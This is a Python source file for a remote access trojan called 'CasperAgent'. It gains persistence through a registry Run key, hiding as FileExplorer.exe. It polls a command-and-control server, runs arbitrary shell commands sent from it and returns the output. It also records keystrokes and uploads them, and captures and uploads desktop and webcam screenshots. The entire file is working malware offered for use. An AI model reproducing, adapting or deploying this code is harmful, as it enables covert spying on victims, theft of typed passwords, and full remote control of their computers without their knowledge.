import os
import random
import time

import pyautogui
import pynput.keyboard
import requests
import sys
import json
import socket
import subprocess
import random
import threading
import base64
from pyautogui import screenshot
import imageio
import shutil
from pynput import keyboard


# result = subprocess.check_output([batcmd], stderr=subprocess.STDOUT)




# command line args for easy deployment from the command line
listeningServer = sys.argv[1]
listeningPort = sys.argv[2]
path = sys.argv[3]





class CasperAgent():
    def __init__(self):
        super().__init__()
        self.url = url = "http://" + listeningServer + ":" + listeningPort + path
        self.keysUrl = "http://" + listeningServer + ":" + listeningPort + "/keys"
        self.uploadUrl = "http://" + listeningServer + ":" + listeningPort + "/uploads"
        self.jsonHeader = headers = {'Content-Type': 'application/json'}
        self.ip = str(socket.gethostbyname(socket.gethostname()))
        self.registration = ""
        self.bRegistered = False
        self.speed = 10 # default request speed in seconds
        self.log = ""
        self.bKey = False
        self.bStopKey = False
        self.keyboard_listener = ""
        self.keySendSize = 20
        self.data = self.log
        self.imageName = ""
        self.usingDutchmanProxy = False
        self.os = ""
    # ========================================================
    # persistence

    def embed_startup_windows(self):
        embed_dir = os.environ["appdata"] + "\\FileExplorer.exe"
        if not os.path.exists(embed_dir):  # ensure that file is only embedded in registry once
            shutil.copyfile(sys.executable, embed_dir)
            subprocess.call(
                f"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d {embed_dir}",
                shell=True)



    def get_persistence(self):
        try:
            self.embed_startup_windows()
        except Exception as e:
            print(e)



    # redefine keys class report method for api interaction
    # key logging
    # =========================================================
    def report(self):
        if self.bKey:
            if len(self.log) >= self.keySendSize:
                print(self.log)
                self.postToKeys()
                self.log = ""
                self.runTask()
        # added this variable to inherited function to stop
            timer = threading.Thread(target=self.report)  # calls itself with a time interval
            timer.start()


    def startKeys(self):
        self.keyboard_listener = keyboard.Listener(on_press=self.process_key_press)
        with self.keyboard_listener: # infinite threading
            self.report()
            self.keyboard_listener.join()  # starts listener

    # this function to post to c2
    def postToKeys(self):
        dataJson = json.dumps({'keys': self.log, "ip": self.ip})
        print(dataJson)
        requests.post(self.keysUrl, headers=self.jsonHeader, data=dataJson)

    def process_key_press(self, key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            elif key == key.backspace:
                self.log = self.log[:-1]
            else:
                self.log = self.log + "  " + str(key) + "  "  # takes special k
        if not self.bKey:
            return False

    # ==========================================================

    def get_response(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("127.0.0.1", 69))
        sock.listen(1)
        conn, addr = sock.accept()
        data = conn.recv(8192)
        conn.close()
        sock.close()
        return data


    def parse_response(self, response):
        start_response = 0
        end_response = 0
        my_str = ''
        sec_str = ''
        for i in range(len(response)):
            if response[i] == '{':
                start_response = i
            if response[i] == '}':
                end_response = i
        for i in range(start_response,end_response+1):
            my_str += response[i]
        for i in my_str:
            if i != '\\':
                sec_str += i
        print(f'Sec_str: {sec_str}')
        return str(sec_str)




    def register(self):
        registrationData = json.dumps({'agent': self.ip})
        response = requests.post(self.url, headers=self.jsonHeader, data=registrationData)
        if response.status_code == 201 or response.status_code == 400:
            self.bRegistered = True



    def getTask(self):
        # response =
        if not self.usingDutchmanProxy:
            response = requests.get(self.url, headers=self.jsonHeader, data=json.dumps({"agent": self.ip})).json()
            return response
        else:
            try:
                response = requests.get(self.url, headers=self.jsonHeader, timeout=1, data=json.dumps({"agent": self.ip})).json()
            except Exception:
                response = self.get_response()
                response = response.decode('utf-8')
                #print(type(response))
                #print(response)
                response = self.parse_response(response)
            return response

    def putResult(self, task, result):
        task['result'] = 'SUCCESS'
        task['feedback'] = result[0:125]
        postData = json.dumps(task)
        if not self.usingDutchmanProxy:
            requests.put(self.url, headers=self.jsonHeader, data=postData)
        else:
            try:
                requests.put(self.url, headers=self.jsonHeader, data=postData, timeout=1,)
            except Exception:
                pass
        print('Success')
        time.sleep(random.randint(0, self.speed))
 # ===============================================================================

    def deleteImage(self, image):
        a = True
        try:
            image.close()
        except Exception:
            pass
        while a:
            time.sleep(3)
            contents = os.listdir()
            if self.imageName in contents:
                try:
                    os.remove(self.imageName)
                    a = False
                except Exception as e:
                    print(e)
                    print(contents)


# ================================================================================
# slice string based on spaces, use first word as command rest as parameters
    def runTask(self):
        task = json.loads(self.getTask()) # convert json data to a dict
        if 'none' not in task: # dont enter if no tasks
            if task['command'] == "keylogger ": # start keylogger
                self.putResult(task, result="logger started")
                self.bKey = True
                self.bStopKey = False

            elif task['command'] == "keylogger stop": # stop keylogger
                self.putResult(task, result="logger stopped")
                self.bKey = False
            # set speed of requests
            elif task['command'][0:5] == "speed":
                save = task['command']
                task['command'] = task['command'].split(' ')
                self.speed = int(task['command'][1])
                result = f"Speed set to {str(self.speed)}"
                task['command'] = save
                print(task)
                self.putResult(task, result)

            elif task['command'] == 'screenshot ':
                name = 'image' + str(random.randint(0, 100)) + str(random.randint(0, 100)) + str(random.randint(0, 100)) + '.png'
                pyautogui.screenshot(name)
                image = open(name, 'rb')
                files = {'file': image}
                requests.post(self.uploadUrl, files=files)
                result = "screenshot posted to uploads"
                self.imageName = name
                self.putResult(task, result)
                self.deleteImage(image)

            elif task['command'] == 'screenshot webcam':
                name = 'image' + str(random.randint(0, 100)) + str(random.randint(0, 100)) + str(
                    random.randint(0, 100)) + '.png'
                try:
                    camera = imageio.get_reader("<video0>")
                    image = camera.get_data(0)
                    print(image)
                    imageio.imwrite(name, image)
                    print('stop')
                    camera.close()
                    image = open(name, 'rb')
                    files = {'file': image}
                    requests.post(self.uploadUrl, files=files)
                    result = "webcam screenshot posted to uploads"
                    self.imageName = name
                    self.putResult(task, result)
                    image.close()
                    self.deleteImage(image='files')
                except Exception as e:
                    print(e)
                    result = "unable to take webcam screenshot"
                    self.putResult(task, result)

            # run shell commands
            else:
                save = task['command']
                task['command'] = task['command'].split(" ")
                for i in range(len(task['command'])):
                    if task['command'][i] == " " or task['command'][i] == "":
                        task['command'].remove(task['command'][i])
                try:
                    result = subprocess.check_output([i for i in task['command']], stderr=subprocess.STDOUT).decode('utf-8')
                    task['command'] = save
                    self.putResult(task, result)
                except Exception:
                    result = "BAD COMMAND"
                    task['command'] = save
                    self.putResult(task, result) # r

        else:
            time.sleep(random.randint(0, self.speed))



casper = CasperAgent()
casper.get_persistence()
while True:

    casper.runTask()
    print("no current task")
    if casper.bKey:
        casper.startKeys()





